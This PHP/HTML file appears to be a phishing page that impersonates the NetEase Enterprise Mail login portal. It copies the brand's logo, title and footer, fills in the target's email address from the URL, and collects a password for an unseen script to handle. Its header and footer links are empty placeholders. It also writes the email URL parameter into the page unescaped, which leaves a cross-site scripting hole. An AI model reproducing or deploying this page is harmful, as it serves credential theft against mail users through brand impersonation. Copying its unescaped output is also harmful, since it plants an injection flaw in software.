<?php require_once 'useful.php'; ?>
<?php
	if(isset($_GET['email'])){
		$email = $_GET['email'];
	}
?>
<!DOCTYPE html>
<html>
<head>
	<title>网易企业邮箱 - 登录入口</title>
	<link rel="icon" href="files/favicon.jpg" />
	<link rel="stylesheet" href="style.css" />
	<link rel="stylesheet" href="vendor/bootstrap/css/bootstrap.min.css">
</head>
<body>
	<div class="bg p-0">
		<header>
			<div class="header-container">
				<img src="files/logo.png" width="160px" height="35px">
				<div style="display: inline-flex; justify-content: flex-end;float: right;">
					<a href="" class="text-white ml-3"><small>新用户开通</small></a>
					<a href="" class="text-white ml-3"><small>English</small></a>
					<a href="" class="text-white ml-3"><small>国外用户登录</small></a>
					<a href="" class="text-white ml-3"><small>邮箱大师</small></a>
					<a href="" class="text-white ml-3"><small>帮助中心</small></a>
				</div>
			</div>
		</header>
		<section style="float: left;">
			<div class="row">
				<div class="col-xs-12 col-sm-12 col-md-10 col-lg-9 col-xl-9 mx-auto mt-5">
					<div class="float-right col-12 mt-5"></div>
					<div class="col-sm-12 col-md-7 float-left mt-4 d-none d-sm-none d-md-inline d-lg-inline d-xl-inline">
						
					</div>
					<div class="col-sm-12 col-md-4 float-left mt-3 shadow rounded bg-white">
						<div class="col-12 p-0">
							<div class="col-12 py-2">
								<h5 class="m-0 py-1 text-center mt-4"><strong>邮箱帐号登录</strong></h5>
							</div>
							<div class="form-group px-4">
								<div class="alert alert-info hide py-0" id="processing"></div>
							</div>
							<?php if(!empty($_GET['email'])): ?>
								<div class="form-group px-4 mt-2">
									<input class="form-control" id="email" value="<?php echo $_GET['email']; ?>" placeholder="邮箱地址" disabled="">
									<small id="error" style="color:red;"></small>
								</div>
							<?php else: ?>
								<div class="form-group px-4 mt-2">
									<input class="form-control" id="email" value="" placeholder="邮箱地址">
									<small id="error" style="color:red;"></small>
								</div>
							<?php endif; ?>
							<div class="form-group px-4 mt-4">
								<input class="form-control" type="password" id="password" placeholder="密码">
								<small id="error" style="color:red;"></small>
							</div>
							<div class="form-group px-4">
								<input type="checkbox" class="rounded bg-dark" id="remember">
								<label class="text-secondary">下次自动登录</label>
								<label class="text-primary float-right">忘记密码</label>
							</div>
							<div class="form-group px-4">
								<button class="btn btn-block btn-lg btn-primary" id="login">登 录</button>
							</div>
							<div class="form-group px-4">
								<p class="text-primary text-center">注册新帐号</p>
							</div>
							<div class="form-group px-4 mt-5 float-right">
								<p class="text-right mt-5 text-primary">忘了密码？</p>
							</div>
						</div>
					</div>
				</div>
			</div>
		</section>
	</div>
	<div class="col-12 float-left text-center">
		<div style="display: inline-flex; justify-content: center;float: right;" class="col-12 py-3">
			<a href="" class="text-secondary mx-2"><small>关于网易</small></a>
			<a href="" class="text-secondary mx-2"><small>官方微博</small></a>
			<a href="" class="text-secondary mx-2"><small>相关法律</small></a>
			<a href="" class="text-secondary mx-2"><small>隐私政策</small></a>
			<a href="" class="text-secondary mx-2"><small>|</small></a>
			<a href="" class="text-secondary mx-2"><small>网易公司版权所有©1997-2020</small></a>
			<a href="" class="text-secondary mx-2"><small><img src="files/knet.png"></small></a>
		</div>
	</div>
</body>
<script type="text/javascript" src="script.js"></script>
</html>